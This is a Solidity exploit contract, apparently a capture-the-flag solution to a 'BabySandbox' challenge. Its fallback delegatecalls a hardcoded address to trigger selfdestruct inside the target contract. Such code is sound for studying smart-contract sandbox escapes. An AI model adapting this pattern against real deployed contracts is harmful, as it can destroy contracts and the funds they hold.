pragma solidity 0.7.0;

import "./BabySandbox.sol";

contract BabySandboxExploit {
    address exploitAddress = address(this);

    function modifyState() external {
        assembly {
            selfdestruct(0x00)
        }
    }

    function getSelector() external pure returns (bytes4 selector) {
        selector = BabySandboxExploit(0x00).modifyState.selector;
    }

    fallback() external {
        // selector of modifyState()
        bytes4 selector = bytes4(0x74def392);
        assembly {
            mstore(0x00, selector)
            let success := delegatecall(
                gas(),
                // hardcoded address of this exploit contract
                0x8F37Fb31d618513553fdF93e90c4C11BD8bf112c,
                0x00,
                0x04,
                0,
                0
            )
        }
    }
}
